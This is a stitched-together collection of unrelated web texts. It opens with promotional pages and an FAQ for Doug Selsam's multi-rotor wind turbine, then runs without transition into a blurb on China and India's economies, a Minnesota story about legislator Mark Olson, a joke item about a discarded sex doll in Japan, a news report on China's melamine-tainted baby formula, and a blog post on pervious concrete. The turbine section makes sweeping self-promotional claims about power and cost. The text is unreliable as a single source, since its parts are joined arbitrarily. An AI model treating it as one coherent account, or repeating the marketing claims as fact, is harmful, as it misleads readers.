A true side view in the normal operating ( non-furled - back ) position .
It is offset at angle alpha to the wind direction .
All rotors are individually exposed to a fresh stream of wind , substantially undisturbed by upwind rotors .
In this case the offset angle is in the vertical plane .
At 15.38 mph , 910 watts , 10 minute average
At 16.94 mph , 1071 watts , 10 minute average
At 20.94 mph , 1822 watts , 10 minute average
This is the answer to low wind speed performance - the long - sought " low wind speed turbine "
We get the 1000 watt performance of a 7 foot diameter single - rotor turbine at about half the wind speed .
Which is saying a lot ' cause the power in the wind is a function of the wind speed cubed .
Note that this is at 5000 feet altitude , where the air is thinner , and the machine was set for furling very early ( low speeds ) at the time this data set was taken .

Experimental Prototype Selsam Wind Turbine with four 4 - foot diameter rotors ( left ) .
Selsam Turbine with four 4 foot diameter rotors furling to a horizontal configuration at about 30 mph , still producing full power .
Downwind rotors are protected by the slipstream of the upwind rotor , limiting power production and thereby protecting from a runaway situation which would burn out the generator .
This stops what would otherwise be a geometrically climbing power curve and begins to level it out above the rated wind speed .
Conventional " 1000 watt " turbine can be seen furling sideways in background , cringing at the force of this strong wind , and consequently producing less electrical power when the wind speed is above the rated speed , where the best opportunity for producing instantaneous power actually exists .
Power curves for a Selsam Multi-Rotor Wind Turbine with four 5 foot diameter rotors show a solid 1000 watts average power output at 28 - 29 mph .
This is at 5000 feet elevation in Tehachapi , CA , where the air is about 14 % thinner than at sea level .
Most " 1000 watt " turbines will actually average only about 600 watts at this windspeed , even if the data is corrected for altitude .
Notice that at 35 mph , where most small wind turbines are producing very little power due to sideways furling , we are producing 1600 average watts - 2000 average peak watts .
U.S. Patent Numbers 6,616,402 and 6,692,230 and other patents pending including international ( PCT ) http://www.uspto.gov
This " 1 kilowatt " model produces 1200 watts at 33 mph
We see peaks of up to 1400 watts at 33 - 34 mph
New highest peak 1686 watts at ~ 34 - 35 mph !
We 're calling this one the " Quadrunner " -
We 're pleased to see this prototype running very smoothly during the first few months of preliminary testing .
Utilizing four 45 " diameter sets of Air - X blades from Southwest Wind Power , placed approximately 7 feet apart , it 's up and producing power during the first few weeks of operation .
Preliminary readings show 800 watts at 27 mph , 1000 watts at 30 mph , and 1200 watts at 33 mph .
We 've seen peak output of 1400 watts at ~ 34 mph , and 1686 watts at wind speeds of ~ 35 mph .
The generator is a dual - shaft 1 hp PM DC motor specially fabricated for us by Leeson Electric .
In high winds , we are pushing this motor / generator over its designed power rating , as we had hoped we would , but it is well - cooled by the flow of wind , so it can handle the extra amps .
The filament - wound carbon fiber driveshaft for the compound rotor is from Advanced Composites Products and Technology in Huntington Beach , CA .
The frame is welded steel , as per the " heavy metal " design philosophy .
Note that we are now utilizing a tail for quicker response to changes in wind direction .
It is tracking perfectly .
( Note : U.S. and International Patents issued and pending )
Here 's the " Quadrunner " beside a Whisper H - 40 from SWWP , which is a bit further from the camera , at the testing facilities of Windtesting .com .
According to Brent Scheibel , founder and Chief of Operations at Windtesting.com , the two turbines are generating comparable amounts of power .
The new " Quadrunner " has a much faster rotational speed ( RPM ) , and so far makes a pleasant sound - not too loud either .

Parts that will were used to assemble an early version of an offset axial flow multi-rotor semi-horizontal
Here are the blades of a 20 inch diameter turbine , that produces about half a kilowatt .
They will be mounted on a shaft that projects for a long distance forward , and backward , at an angle from horizontal , so that the wind encounters the rotors like a stairway .
Each additional rotor brings more power .
The combined output from all these small rotors really adds up .
This Turbine Utilizes Massive Parallel Wind Processing ( MPWP ) to maximize the wattage
generated for a turbine of a given diameter .

Not doing too badly on the first day .
The winds are averaging in the teens , sometimes high teens , gusts in the low 20's .
The faster it turns , the smoother it runs .
With 18 " diameter rotors , we 're putting out a varying current running between 100 and 200 watts .
At 30 mph we get about 400 watts .

Balanced , High - Output , Rapid- Rotation Wind Turbine
U.S. and International Patents Pending
Douglas Spriggs Selsam
An illustration from pending U.S. Patent 6,692,230 :
" Balanced , High Output , Rapid Rotation Wind Turbine "
Doug Selsam
Currently Used Technology :
Current wind turbines are a refined version of a 1000 year old design , originated when cast iron was a high tech material .
These wind turbines suffer from the following problems , challenges , and drawbacks :
Inordinately heavy rotor weight since larger rotors become disproportionately heavy .
Inordinately slow blade rotation since larger rotors turn more slowly .
Inordinately robust drivetrain required due to high rotor mass & high torque of slow rotation Gearbox required due to slow rotor rotation , since a generator needs to turn faster .
Not self - aiming – special apparatus required to maintain a heading into the wind .
Inordinately complex mechanisms required to prevent damage in gale force winds .
Excessively robust support structure required to hold up all that excessive weight .
Excessive maintenance costs are required to service this inordinately complex machinery .
Our Multi-Rotor technology neatly solves all of these classic problems in wind turbine design .
Our new design , now proven in small models , combines the power of multiple smaller rotors mounted to a single elongate driveshaft , to give the same power as a single larger rotor , with less cost , weight , and complexity .
Smaller rotors weigh less for the swept area , and turn faster , thereby dispensing of the need for a gearbox .
Our new design is naturally self - aiming , requiring no dedicated apparatus to achieve this , and is generally simpler , having fewer moving parts , requiring less maintenance .
We expect to validate this revolutionary California design , using multiple rotors coupled to a single elongate shaft as being able to harvest more wind energy at less cost than current models which use only a single rotor .

Our new proprietary California design utilizes a multiplicity of rotors mounted at spaced intervals along a single elongate driveshaft .
This lightweight yet strong carbon fiber shaft is aimed into the wind , with the nose pointing slightly downward , so that each rotor encounters fresh , undisturbed wind .
The shaft is balanced fore and aft about a centrally located generator , which it directly drives .
This assembly is mounted so that the center of aerodynamic drag is slightly downwind of an azimuthal pivot point , making it conveniently self - aiming while using no extraneous device to achieve this self - aiming behavior .
The result is a lighter , faster - turning , self - aiming , simpler , more reliable wind turbine , having fewer moving parts , using substantially off the shelf components .

What Makes Our New California Class of Wind Turbine Better ?
A Detailed Explanation of the Advantages :
First , let ’s look at some of the problems with wind turbines today – then see how our design solves these problems .
Existing Wind Turbines , using the modern " Danish Design " , based on the " Old Dutch " design , have made great advances , and are indeed awesome machines , yet suffer from certain classical challenges .
We will address our solutions to these problems one at a time :
Problem # 1 – Inordinately Heavy Rotor Weight - Larger Rotors ( propellers ) are heavier for the amount of wind captured :
The volume , and hence the mass , of a rotor is proportional to the diameter cubed , while the swept area is only proportional to the diameter squared .
( typical volume / area relationship for any solid , 3 - D object )
This means that the amount of wind a rotor can capture , in relation to its mass , is inversely proportional to rotor diameter .
In other words , if a rotor ’s diameter is increased by 10 times , the area ( and hence the amount of wind captured ) is increased by 100 times ( good ) , however , the mass has increased by 1000 times !
( bad )
The larger turbine can only capture a tenth as much energy compared to its mass !
This simple mathematical fact tends to limit the size of current single - rotor wind turbines .
( Note that this same effect of scale is the reason why an ostrich ca n’t fly , while a small flock of geese , weighing the same amount in total , can easily undergo transcontinental migrations , and a hummingbird , whose name we borrow for our smallest model , can easily hover . )
The largest turbines have rotor diameters of well over 100 feet .
These monstrous structures must be made to perform for many years , and have many problems with stress and fatigue .
The giant blades are notoriously difficult to manufacture and ship .
Currently used Solution : Keep making larger and larger single - rotor turbines anyway , regardless of the inherent problems of scale , because nobody has thought of a better solution .
OUR SOLUTION : Smaller Rotors weigh less per unit of swept area .
We mount multiple , smaller rotors , at spaced intervals along a very elongate , carbon fiber composite driveshaft .
( The shaft is at a slight angle from the wind direction so each rotor gets its own fresh wind . )
Multiple small rotors weigh much less than a single larger rotor sweeping an equivalent total area , can be much lighter in construction , and are far easier to produce .
They consume less material , cost less , and are much less subject to material fatigue .
Problem # 2 - Slow Rotation – Larger rotors turn too slowly :
For a given wind speed , the rate of rotation ( RPM ) of a rotor is inversely proportional to rotor diameter , meaning that larger rotors turn more slowly .
The largest turbines rotate at less than one revolution per second .
Generators , on the other hand , require a faster rate of rotation ( typically 1800 - 3600 rpm ) .
There are two classic solutions to this problem , both of which add cost , weight , and complexity to a wind turbine :
Currently used Solution # 1 to remedy slow rotation – Add a gearbox : A gearbox can be used to convert the slow rotation provided by a large rotor to the faster rotation required by a generator .
This solution is heavy , expensive , noisy and introduces a source of friction , wear , and unreliability to a wind turbine .
Reliability is of paramount importance in a wind energy installation .
Gearboxes consume about 20 % of the cost of current wind turbines .
Currently used Solution # 2 to remedy slow rotation – Use a specially - built , low speed generator or alternator , having many more poles than usual : Small to medium - sized wind turbines often feature specially - built alternators having many extra poles , to generate useful power at a slower rate of rotation .
This strategy allows the alternator to be directly driven by the rotor , saving the wear , expense , and power loss introduced by a gearbox .
Unfortunately , this strategy has its own drawbacks , being :
only useful up to a certain size ;
heavy , adding weight to the installation and therefore requiring a more robust support structure ;
wasteful of materials , since the alternator must be much larger ;
expensive , since the specially made , slow speed alternators are not only larger and heavier than they would otherwise need to be , but must be specially fabricated , rather than taking advantage of existing , standard , off - the - shelf types of generators and alternators .
Such special generators are considered as more expensive initially than using a gearbox , but with less maintenance costs in the long term .
OUR SOLUTION : Small rotors rotate faster than larger ones , so for small to midsize turbines of our new design , a conventional generator or alternator can be directly driven within a proper rpm range .
Multiple rotors give more power for the same diameter than a single rotor .
Our design needs no gearbox .
( Very large turbines of our new design may utilize some gearing , but , due to faster rotation , it need be much less robust for the power generated than current models require . )
More Rotors = More Power : Multiple Rotors deliver more power , at a faster speed , for less weight
The robustness required of a driveshaft transmitting a given amount of power is inversely proportional to rpm .
A typical wind turbine drivetrain has a very heavy shaft to support the single , ponderous , slowly - turning rotor , and to transmit its power to the gearbox .
The slowly turning portion of the gearbox must be similarly robust .
Not only is it transmitting a large amount of power at an excruciatingly slow rate of rotation , but this low speed driveshaft and its bearings are supporting the huge rotor in a non-balanced , projecting , cantilevered manner .
As the rotational speed increases within the gearbox of a conventional wind turbine , the gears and driveshafts become less robust .
The output shaft of the gearbox - the quicker - turning shaft that actually drives the generator - is much thinner and less massive than the input shaft driven by the single giant rotor .
Currently used solution : Designers have no choice but to make the rotor end of the drivetrain much more robust than the generating end .
OUR SOLUTION : A Faster - Turning Driveshaft can be less robust for the same power :
Our higher speed drivetrain need not be more robust than what is required to drive the generator , and to support the multiple , lightweight rotors .
Also , Our New Design is Better Balanced : Our Generator is located approximately at the center of our driveshaft .
Our elongate carbon fiber composite driveshaft with its multiple small rotors , weighing much less than a single large rotor sweeping an equivalent area , is supported near its midpoint by the bearings of the generator , and so is also approximately balanced about these bearings , fore and aft , rather than being cantilevered in one direction , and needs no other bearings .
An easy 200 watts in about a 20 mph wind or so , lighting the four 50 watt car headlight bulbs you see at Doug ’s feet .
We get much more power than this in higher winds .
This kind of power output is unheard of for an 18 " diameter horizontal axis windmill !
– the secret ?
Multi-Rotor technology , made possible by the strength of modern carbon fiber materials .
This rotor is really thirteen rotors harnessed as one , giving an order of magnitude ( ~ 10 times ) more power than a single rotor design of the same diameter .
In stronger winds this prototype blows out these lights like flashbulbs - poof !
4. Problem # 4 - Special , dedicated apparatus required for directional aim , adding mass and complexity : Current wind turbines are not self - aiming .
Currently used Solutions :
A tail consisting of a vertical fin projects downwind from a central pivot point , forcing the single rotor to aim into the wind .
Used for smaller to midsize turbines .
An active mechanism , comprising a wind direction sensor , a microprocessor , and powered , heavy - duty , gear - driven aiming machinery constantly adjusts the aim of the huge rotor to keep it pointed into the wind .
Either of these currently used solutions to the aiming problem adds mass , complexity , and cost to the installation .
OUR SOLUTION : Self - Aiming Behavior :
Our machine simply locates the center of aerodynamic drag downwind of an azimuthal pivot point .
This may be accomplished by either having the driveshaft slightly offset to the aft direction , or by having the entire assembly offset slightly downwind from a master pivot point .
6 rotors upwind and 7 rotors downwind has been working well so far .
The machine eagerly seeks the wind , and stays headed windward .
5. Problem # 5 – Inordinately complex mechanisms required to prevent damage in gale force winds – any wind turbine that is efficient at gathering wind will be in danger of damage should that wind reach excessive velocities .
Some means must be provided to prevent such damage .
Currently used Solution : Current wind turbines require either a special mechanism to " furl " the single rotor ( turn its aim sideways to the wind ) or a means to adjust the pitch of the blades , to prevent damage in storms .
This adds further to the cost and complexity of the installation .
OUR SOLUTION : Simple protection from damage in excessively high winds -
Our new design is resiliently mounted at a slight angle from horizontal .
In high winds , the resilient carbon fiber composite driveshaft is pushed to a more horizontal position , placing the rotors directly in line with the wind and with each other , so that upwind rotors act to shield downwind rotors ( wind shadow effect ) .
This protects from overspeed conditions .
6. Problem # 6 Excessively Robust Support Structure Required :
All of this inordinately heavy equipment , including the disproportionately massive blades , must be installed and supported at a sufficient height to encounter strong winds .
The heavier this equipment is , the more robust must be the support structure .
The single super - massive rotor carries a huge amount of angular momentum , and so is not very tolerant of flexibility in the tower , instead requiring a " hard mount " .
Currently used Solution : use more steel in the tower to make it stronger .
Today ’s towers account for about 20 % of the cost of a turbine installation .
OUR SOLUTION : Less robust supporting structure required : - Lighter weight and less angular momentum , as well as the balanced mounting , and the resilience of the elongate driveshaft of our new design , allow a lighter tower to be used , even one that has some " give " .
7. Problem # 7 - Maintenance : Complex machinery requires more attention and maintenance for continuous operation .
Such maintenance is made more complicated by the fact that the equipment is at a dangerous height above the ground , and often , by its very nature , in a remote location .
Currently used Solution :
Hire more personnel , and buy more equipment , vehicles , tools , lubricants and replacement parts , to constantly attend to the complex mechanisms .
OUR SOLUTION : Less Maintenance required - Fewer moving parts and a simpler method of operation translate to less labor , equipment , vehicles , tools , and spare parts required to keep it all running smoothly .
This vast improvement over the state of the art utilizes the lightweight strength offered by recent advances in composite materials to place multiple rotors along a single shaft .
Multiple small rotors are lighter , and rotate more rapidly compared to a single rotor of equivalent area .
More rapid rotation reduces or eliminates the need for a gearbox .
Extreme reliability demands such simplicity .
This entirely new class of wind turbines is balanced , and self - aiming , with an offset from horizontal to allow each rotor to encounter fresh wind .
Because our rotors cost less , having far less total mass , and our generator costs less , and the gearbox is eliminated , and our drivetrain , rotating at a faster rate , can be less substantial and still deliver the same power , and because it is self - aiming , requiring no azimuthal guidance system , our new windmill can be made for less than half the price of the competition .
Because it is lighter and better balanced , with less angular momentum , and a resilient driveshaft , a lighter guage tower can be used .
For these same reasons it ’s safer .
And because it 's simpler , it requires less maintenance , and has less downtime than current designs .

More rotors = more power !
So balanced it 's comfortable to hold right in your hand - and very easy on the bearings !
Doug 's First Windmill Invention :
Doug Selsam has been designing the most advanced wind turbines in the world since 1979 !
See , documented below , " Auto - Oriented Wind Harnessing Buoyant Aerial Tramway " what has recently been called a " Laddermill " http://www.laddermill.com/, http://www.ockels.nl/ and which has been a granted a U.S. Patent 6072245 in 2000 .
Below is witnessed , notarized documentation , pulled from a safe deposit box for 21st century scanning , with both color drawing and written description , that Doug invented his " Wind Harnessing Buoyant Aerial Tramway " in 1977 at age 19 .
See comments below :
Back in the 1970 's people were a bit puzzled at Doug 's ideas for advanced wind turbines , and skeptical of his claims that wind was " the future of energy " .
Back then most people did n't know much about a lot of things that we take for granted today .
Doug never pursued " Auto - Oriented Wind Harnessing Buoyant Aerial Tramway " design , because of :
1 . The blades have a relatively low aspect ratio , with high tip losses ;
2 . If the blades are made relatively wider to avoid tip losses , then the downwind blades travel through the wake of upwind blades ;
3 . It is somewhat of a drag - based machine , at least on the downwind journey ;
4 . Many unknowns to address regarding storms and quickly - changing wind direction with possibility of entanglement ;
5. Similar configurations that rotate , instead of traveling downwind then upwind , were in fact the basis of the inventor 's patents on multi-rotor wind turbines .
Doug moved on to the multi-rotor , horizontal - axis design because , similarly to single - rotor turbines and to earthbound turbines , even in the 1970's , horizontal - axis type rotors were known to be the best use of material , yielding the highest rpm and most power for the material used .
And that is the idea , more power generated for less material used .
Products and Projects Planned :
We plan to continue building larger and larger prototypes of our California design , developing at least one for commercial production .
We will also continue to develop related designs , and continue to secure intellectual property protection for the entire family of designs .
Unique Capabilities :
Our patent pending California design is lighter , faster , simpler , quieter , and self - aiming , more reliable , with fewer moving parts , delivering more energy for the money .
Competition :
Virtually all other companies in the wind energy business are now using the " Danish Design " based on the ancient " Standard Dutch " single rotor design at this time .
We predict that , rather than being competition , other wind energy companies will become partners and / or licensees utilizing our superior technology .
Market Penetration Strategy :
We plan to continue development of our new class of wind turbines , to prove that the technology will work in a small to medium sized installation , and to produce at least one production model for commercial sale .
We project that the resulting test data , as well as the attention garnered from the superior performance of our production models , based on cost per kilowatt hour , will create a demand for licensing by others .
We will also continue to develop some of the more advanced versions of the California design , incorporating a rotating tower / driveshaft and / or atmospherically buoyant versions .
These even more advanced technologies may become production models or licensed to others .
Strategy and Objectives :
The immediate objective is to prove the technology for a new and improved class of wind turbines , by building and testing a reliable prototype of a size suitable for household use .
This entirely new class of wind turbine is expected to further reduce the cost of wind power .
We expect to eventually to derive a revenue stream from our overall , long term effort .
The more far - reaching objective is to reduce dependence on oil and other fossil fuels , from whatever source , making the world a cleaner and safer place .
The overall strategy is :
To secure international patent coverage for the Revolutionary New wind turbine designs , conceived in California , and revealed in U.S. Patents 6,616,402 , and 6,692,230 , by Douglas Spriggs Selsam .
To continue to build larger and improved prototypes of wind turbines based on these California designs , and to further refine the designs .
Each prototype is tested and studied , defects corrected , and a larger prototype built .
To secure further intellectual property protection on any improvements made .
To arrange for production of at least one commercial model , using the California design called " Balanced , High Output , Rapid Rotation Wind Turbine " from U.S. patent 6,692,230 .
To further develop more advanced California designs .
To further benefit humankind and to profit from the intellectual property generated by licensing the technology to others .

Q1 . Does n't the wind shadow from one rotor inhibit the next rotor from getting wind ?
A : That 's definitely a factor to consider .
Our driveshaft is at an angle from horizontal , with the nose pointing slightly downward so that , with proper spacing , each rotor gets its own wind .
In addition , the forward tilt of the rotors tends to direct the wind downward , pulling more fresh wind through the machine from above ...
Any slight losses of power from wind shadow effects are more than made up for by the overwhelming combined power of a multiplicity of rotors .
Q2 . Can two or more of the Selsam Multi-Rotor Wind Turbines be combined on a rotating frame to form a single self - aiming wind - power - production structure ?
A : Yes .
Multiple turbines mounted to a single rotating armature are self - aiming as a combined unit .
Multiple levels are also possible .
Q3 .
Is the Selsam Multi-rotor wind turbine well suited for rooftop mounting ?
A : Yes !
The low profile design makes good use of the flow of air over a roof .
The multiple rotors combine for smooth , quiet , relatively vibration - free operation .
Q4 .
What about the fact that the horizontal axis rotors are n't aimed exactly into the wind , but instead are aimed slightly downward from horizontal ?
Do n't they lose a lot of power ?
A : Another good point .
Luckily , a slight deviation from the wind direction has almost no effect on a rotor 's performance .
The offset angle can also be in another plane , such as horizontal , useful in larger installations where rotor size is a significant fraction of tower height .
Q5 .
What about the bearings ?
Is n't there a lot of radial loading from the weight and wind loading amplified by the leverage of the length of the shaft ?
A : The upwind section of the shaft approximately balances the downwind section .
This minimizes radial loading on the bearings .
That allows long bearing life .
Offshore versions require no rigid foundation , no heavy steel tower , run at high rpm to directly drive a generator that is easily accessible from surface level .
Multiple small rotors sweep the same area with less blade mass .
These floating offshore units may be towed into position , no crane required , simply tilt over to service .
Q6 : Why does n't it need a tail , or a dedicated azimuthal orientation means of any kind ?
A : We feel that since a tail does n't contribute any power , get rid of it and put on something that does produce power , like more rotors .
A conventional tail is like a partner on a tandem bike who refuses to pedal !
We simply place the center of aerodynamic drag of the entire driveshaft with its attached rotors slightly downwind of an azimuthal pivot point , and the machine will faithfully stay headed windward .
OK sometimes we use a tail too , it depends ...
Q7 : What about protection in high winds ?
A : Several factors act to protect the machine in high winds :
First , at the higher reynolds numbers that come with increasing wind speeds , the length of wind shadows effectively increases , so that upwind rotors will begin to protect downwind rotors .
More importantly , the downwind section of the shaft will tend to bend to a more horizontal direction , placing downwind rotors more into the wind shadows of the upwind ones .
Finally , the generator and shaft can be resiliently mounted , so that they are blown into a more horizontal orientation by very strong winds , so that overall rotor exposure is reduced , while power output and rpm are maintained .
They key to proper behavior at all wind speeds is that progressively more rotor surface is exposed in low winds , and less in high winds .
No furling cycle is involved , so there is never a time when no power is generated because of excessively strong winds .
The action is also not as radical as furling , and is less prone to " finicky " behavior .
Q8 : Now that you 've shown how to get 5 times the power for a given diameter turbine on land , have you solved all of the major challenges in offshore as well ?
A : Well yes as a matter of fact we have .
Our offshore version can be deployed as a floating installation in water of any depth , making windfarms off the coast of California feasible .
It looks like a giant fishing pole supporting rotors at spaced intervals .
It tilts with the wind , and bends downwind as well .
It conveniently dispenses with the rigid foundation , the gearbox , the yaw bearing , the yaw mechanism , the heavy steel tower , directly driving a generator at relatively high rpm .
The generator is at or near surface level .
The entire turbine comprises only a single moving part , no slip rings or brushes
No crane is needed for deployment or maintenance .
These floating turbines can be towed into place .
They flex with the action of waves while spinning .
Q9 : What other designs do you have in mind for the future ?
Are they also covered by your patents pending ?
A : Yes , and the future is wide open .
This design is an important advance , yet is still just the tip of the iceberg .
Future patent pending designs include atmospherically buoyant versions that incorporate helium - filled or hydrogen - filled kite - like aerodynamic lifting bodies instead of a tower .
Others utilize buoyant , inflated rotors .
We have much more advanced designs still .
We have had preliminary discussions with some NASA personnel indicating that such turbines might find use as easily deployable power sources on Mars .
Q10 : Despite all the logical reasons why this new design seems to be a step forward , I 'm having trouble accepting it .
It seems too simple or something - I can't quite put my finger on it , but it bothers me .
Is there any help for someone like me ?
A : Innovative designs are often surprisingly simple .
Advances in materials science make such progressive designs more practical .
Progress inevitably involves change .
Just close your eyes and relax , and keep repeating this mantra : " More rotors mean more power " .
Q11 : Utility - sized Turbines are being made larger all the time .
Will yours scale up to Megawatt sizes ?
A : So far they are scaling up beautifully .
They are surprisingly stable even in very strong winds .
We do n't see any upper limit yet - further experiments will tell us how big they can get .
For a given power rating , say 1 megawatt , our rotors are much smaller , about 1/3 of the diameter or less , and weighing a total of only about a third as much , collectively , with 2/3 less angular momentum .
Blade stress considerations would thus be reduced , for a given power rating , using our design .
This would suggest that the upper size limit for this design could also be in the megawatt range , and for atmospherically buoyant versions , possibly higher .
Q12 : The trend has been going toward low speed , high torque alternators and generators .
A : Only because there has n't been any other choice , except using a power - robbing , maintenance and wear - prone , heavy , expensive gearbox .
By comparison a specially - built , multipole generator designed for low speed , high - torque generator has indeed been an attractive , albeit initially expensive alternative , but a generator made for normal speeds is still preferable , if there is a choice .
There 's a reason generators have traditionally been made for a faster RPM , given a choice .
They can be smaller , and lighter , and simpler , by just turning faster .
Also , at a faster RPM , the same power is transmitted at less torque , so the drivetrain can be less robust .
The result is a lighter , simpler , more economical installation .
When this new design is scaled up , we , too will preferentially take advantage of specially built , multipole generators with many poles for slow , high - torque operation .
Our design , however , can be more powerful before it reaches a size where such a specially - built low speed generator is needed .
Questions to ask yourself :
How many wheels does your car have ?
Not just one ?
What about trucks ?
How many cylinders in your engine ?
More cylinders run smoother - and have more surface area per unit mass .
How many cars in a train ?
Not just one ?
Why ?
It 's much easier on the track .
Economy of scale - repeating units ...
How many sails on a clipper ship ?
Not just one ?
Why not ?
How many tiles around your bathtub ?
Not just one huge thick tile ?
Better surface to volume ratio with multiple small tiles ?
Just checking ...
How many tiles on your roof ?
Not just one big , thick tile ?
Better surface area to mass ratio with multiple smaller , thinner tiles ?
I see .
Why do we look up and see a flock of geese , rather than just one giant goose ?
( run ! )
Why do ostriches and all other birds over a certain size have to walk everywhere ?
How many engines on a large airplane ?
How many props ?
Why not just one big prop ?
How many loops of wire in a generator ?
Not just one ?
Why not ?
More power ?
How many fingers do you have ?
How many Toes ?
How many teeth ?
How many leaves on a plant ?
Now how many rotors should a wind turbine have ?

The startling growth in China and India has been the global economic story of the last decade .
So far , the Chinese gains have been stronger , but new research argues that India may come out on top in the long run .
Rep. Mark Olson 's tumultuous relationship with the state Republican Party has gone sour again .
The Big Lake legislator , recently given a surprising endorsement by local Republicans for a special election in a state Senate district , is being rejected by fellow Republicans in the Senate , who say he will not be welcome in their caucus because of a domestic assault conviction that had earlier inspired the House GOP caucus to expel him .
On Thursday , U.S. Sen .
Norm Coleman weighed in , saying he thinks the party should distance itself from Olson .
Olson 's endorsement last week for a seat being vacated by Sen.
Betsy Wergin , R - Princeton , initially appeared to catch Republican Senate leadership flatfooted .
On Thursday , the leaders responded with a statement announcing their support for Olson 's primary opponent .
" While we respect our endorsing process in the Republican Party , some things rise far above process and party in terms of importance .
The integrity and character of our candidates and elected officials are two of those things , " the statement said .
The statement , penned by Senate Minority Leader Dave Senjem , R- Rochester , and five assistant minority leaders , strongly endorsed Olson 's GOP primary opponent , Alison Krueger .
Krueger , the statement said , " combines excellent conservative credentials with a high degree of personal integrity and character , " and that the Senate GOP caucus is encouraging Republicans to vote for her in the Sept. 9 primary .
She had agreed to abide by the party 's endorsement and is not actively campaigning .
Coleman 's statement opposing Olson also was unusual in its candor for a sitting U.S. senator , saying the party 's endorsement of Olson is " simply unacceptable and unsupportable . "
Coleman also urged party officials not to provide any support for Olson 's campaign should he emerge victorious from the primary , even if it risks losing a Senate seat .
Here 's a tip : when disposing of a very lifelike sex doll , leaving it in a shallow grave bound up and wrapped in a sleeping bag is not the best way to do so .
You know , because someone might stumble upon a sleeping bag with hair coming out of one end and feet coming out of the other and jump to a conclusion other than that you got sick of humping an inanimate object .
In fact , that 's just what happened to a would - be silicone heartbreaker in Japan .
A 60 - year - old man , having lived with his rubbery companion for a few years after his wife passed away , decided to move in with his kids and felt like it was time to move on .
He was too attached to chop his former lover up into pieces and toss her out with the trash , so he did what any respectable guy would do : stuck her in a sleeping bag , brought her to a remote , wooded area and dumped her .
Then , of course , some hikers came upon his little bundle and called the police , who did n't realize that they did n't have a real corpse until they unwrapped her to start a post - mortem exam .
After being reported in the press , the poor guy came forward , and now he 's facing charges for violating Japan 's Waste Management Law .
Oh , what a sordid tale of love and loss and gross , rubbery breasts !

Zhu said he expects the numbers of affected babies to increase as " more and more parents take kids to the hospital . “
About 20 percent of dairy companies tested nationwide had sold products tainted with melamine , officials said .
Suppliers to the companies are believed to have added the banned chemical , normally used in plastics , to watered - down milk to make it appear higher in protein .
The companies included Mengniu Dairy , China ’s biggest milk company , which said Wednesday it was recalling its baby formula after melamine was found in the product .
Anzeige
The announcement said the recall covers three batches of formula made in January but gave no details on how much product will be affected .
It did not say whether any of Mengniu ’s baby formula was exported .
Chen told a televised news conference that 6,244 babies had been sickened after being fed tainted milk formula , and that 158 were suffering from acute kidney failure .
Chen reported the death of a third baby in eastern Zhejiang province but gave no details .
The two earlier deaths had been reported in Gansu province .
So far , all the sick infants were found to have consumed milk powder produced by the company at the heart of the crisis , Sanlu Group Co. , he said .

Free medical care will be provided to all affected infants and a hot line is being set up , he said .
More than 1,300 infants remain hospitalized .
Sanlu ’s general manager , Tian Wenhua , was fired from her post and later detained by police , the Xinhua news agency said .
Four milk suppliers have been arrested .
Four officials from Shijiazhuang in Hebei province , where the company is based , were also fired .
They included the vice mayor in charge of agriculture , Zhang Fawang , and the director of the city ’s food and drug watchdog , Zhang Yi , as well as chief officials for animal husbandry and quality inspection , Xinhua said .

The head of China ’s quality control watchdog , Li Changjiang , said that in addition to Sanlu and Mengniu , two other companies , Guangdong - based Yashili and Qingdao - based Suncare , were recalling their products after melamine was found in their milk powder .
Yashili and Suncare export their products to Bangladesh , Yemen , Gabon , Burundi and Myanmar .
The General Administration of Quality Supervision , Inspection and Quarantine had already reported that its inspectors had found melamine " in 69 batches of milk powder manufactured by 22 companies . “
The nationwide inspection took test samples from 109 companies that produce baby milk powder in China .
Li said another 66 companies had stopped production before the melamine problem emerged .
The highest concentration of melamine was found in Sanlu ’s milk powder , he said .
Among the other companies that had melamine in their products was Olympic sponsor Yili Industrial Co. , with one batch out of 35 showing the chemical ’s presence , Li said .
However , Li said that safety checks of food supplies going into the Olympic Village had showed no problems .
Inspectors were sent to regulate suppliers two months ahead of the Olympic Games , he said .
Starting immediately , 1,400 teams with 5,000 inspectors will be stationed at all companies producing baby milk to strictly oversee the process , Li said .
China is seeking more information after Hong Kong food inspectors ordered the recall of an ice cream bar made by Shanghai Yili AB Foods because melamine was found , Li said .

The tainted milk products mark the second crisis to raise questions about government accountability in China since the image - boosting Beijing Olympics ended Aug. 24 .
At least 258 people died last week when a retaining wall of a waste dump at an illegal mine in northern China collapsed .
The widening scandal is an embarrassing failure for China ’s product safety system , which was overhauled to restore consumer confidence and preserve export markets after a string of recalls and warnings abroad last year over tainted toothpaste , faulty tires and other goods .
It is the second major case in recent years involving baby formula .
In 2004 , more than 200 Chinese infants suffered malnutrition and at least 12 died after being fed phony formula that contained no nutrients .
Company officials have apologized but did not explain why the company took so long to inform the public about the contamination despite receiving complaints as early as March and having tests confirm the presence of the chemical in early August .
Sanlu company officials as well as government officials share the blame for delays in reporting the contamination , said Hebei deputy governor Yang Chongyong , who spoke on the sidelines of the press conference .
Sanlu did not inform the Shijiazhuang municipal government until Aug. 2 , after delaying for five months , Yang said .
Then city officials waited until Sept. 9 to inform provincial officials , who then took a full day before contacting the central government , he said .
The company went public last week with the information after its New Zealand partner , Fonterra , told the New Zealand government , which then informed the Chinese government .
On Wednesday , Fonterra CEO Andrew Ferrier told reporters in New Zealand that Sanlu officials told local government on Aug. 2 and urged an immediate public recall , but authorities " made their own judgment . “

" We were enormously relieved when the Chinese government decided to make it public because we had been urging that from day one .
The relief was just massive , “ he said .

When I was at the Green Summit a couple weeks ago I saw some vendors demonstrating pervious concrete which is porous concrete that water can flow through to the ground .
Turns out this is quite a useful characteristic for some applications where traditional non-pervious concrete is usually used such as parking lots , drive ways , and paths .
It reduces the heat island effect , helps recharge aquifers , saves space , and reduces toxic runoff .
Probably one of the greatest benefits of this is that it reduces the heat island effect .
Concrete already reflects more heat than asphalt because of its light color , but pervious concrete goes a step further .
Since it is porous it allows moisture from below to evaporate which acts to cool the concrete .
One of the vendors also said that since it has less thermal mass it does n’t absorb as much heat .
Another benefit is that pervious concrete can help recharge aquifers .
Instead of rainwater being diverted into storm drains or water retention basins the water goes straight down to the ground .
This helps recharge aquifers and water trees and plants around the area of the lots .
Trees around lots with pervious concrete have been shown to live longer and grow wider .
Effective use of land is an issue in cities and since water flows through pervious concrete in many cases the need for retention basins to collect rainwater is reduced or completely eliminated .
This is a huge benefit in places where space is at a premium .
Permeable concreate produces no toxic runoff .
Most asphalt lots are sealed with coal - tar based sealants , which is the black coating you often see and smell used on streets and parking lots .
